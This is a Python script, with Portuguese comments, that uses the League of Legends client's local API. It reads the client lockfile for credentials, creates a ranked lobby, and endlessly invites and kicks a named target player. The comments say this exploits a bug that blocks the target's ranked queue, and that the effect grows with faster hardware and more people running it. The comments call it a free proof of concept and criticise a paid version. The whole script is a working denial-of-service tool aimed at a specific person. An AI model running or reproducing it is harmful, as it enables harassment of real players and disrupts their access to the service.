import json, requests, time
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

"""
200R$ eh extremamente caro pra um projeto desses
tirando isso, nao acho que a intencao fosse somente de "ajudar", se fosse, voces nao estariam lucrando com o projeto ( alem de monopolizar na mao dos poucos que podem pagar, enfimmm :^) )
o '''exploit''' (bota aspas nisso) no modelo atual so afeta filas ranqueadas, se quiser mudar isso, altere o $lobbycreatedata pro json respectivo a fila que voce quer (dps eu mexo nisso e torno  global)
pelo que notei, quanto mais forte o hardware, mais fodido sera pra quem for travado. isso porque sera uma taxa maior de invites/kicks ocorrendo, assim incidindo numa maior chance das duas filas acontecerem ao mesmo tempo e a vulnerabilidade triggar
alem disso, quanto mais pessoas rodando sobre o mesmo alvo = mais eficiente sera etc etc
TEORICAMENTE, esse script eh SUPER mal otimizado (escrito em linguagem de 3 nivel, sem falar do exe compilado). apesar de cumprir a funcionalidade, a ideia dele eh servir como proof of concept, apenas
"""

def getsummonerid(summonnername):
	data = lcureq('/lol-summoner/v1/summoners?name=%s'%(summonnername))
	data = json.loads(data)
	return data

def lcureq(reqendpoint, reqmethod='get', reqdata=''):
	if reqmethod.upper() == 'POST': ##post method
		return session.post(lcu_endpoint+reqendpoint, data=reqdata, verify=False, auth=(lcuuser, lcupass)).text
	elif reqmethod.upper() == 'GET':  ##get method
		return session.get(lcu_endpoint+reqendpoint, verify=False, auth=(lcuuser, lcupass)).text
	elif reqmethod.upper() == 'DELETE':
		return session.delete(lcu_endpoint+reqendpoint, verify=False, auth=(lcuuser, lcupass)).text

lcurawdata = open('C:\\Riot Games\\League of Legends\\lockfile').read()
lcuuser = 'riot'
lcuport = str(lcurawdata.split(':')[2])
lcupass = str(lcurawdata.split(':')[3])
lcumethod = str(lcurawdata.split(':')[4])
lcu_endpoint = '{method}://127.0.0.1:{port}'.format(method=lcumethod, port=lcuport)

session = requests.Session()

sumname = str(input("Summoners Target Name: ")).strip()

sumid = getsummonerid(sumname)['summonerId']

## CREATE LOBBY GAME --RANKED-- ##
lobbycreatedata = '{"allowablePremadeSizes":[1,2],"customLobbyName":"","customMutatorName":"","customRewardsDisabledReasons":[],"customSpectatorPolicy":"NotAllowed","customSpectators":[],"customTeam100":[],"customTeam200":[],"gameMode":"CLASSIC","isCustom":false,"isLobbyFull":false,"isTeamBuilderManaged":false,"mapId":11,"maxHumanPlayers":0,"maxLobbySize":2,"maxTeamSize":5,"pickType":"","premadeSizeAllowed":true,"queueId":420,"showPositionSelector":true}'
lcureq('/lol-lobby/v2/lobby', 'post', reqdata=lobbycreatedata)

#['Requested', 'Pending', 'Accepted', 'Joined', 'Declined', 'Kicked', 'OnHold', 'Error']

print ('[+] Taking %s\'s ranked queue down..'%(sumname))
print ('[+] Triggering the xpl...')

while 1:
	try:
		lcureq('/lol-lobby/v2/lobby/invitations', 'post', reqdata='[{"state":"Accepted","toSummonerId":%d,"toSummonerName":"%s"}]'%(int(sumid), str(sumname)))
		lcureq('/lol-lobby/v2/lobby/members/{}/kick'.format(sumid), 'post')
	except KeyboardInterrupt:
		exit(1)
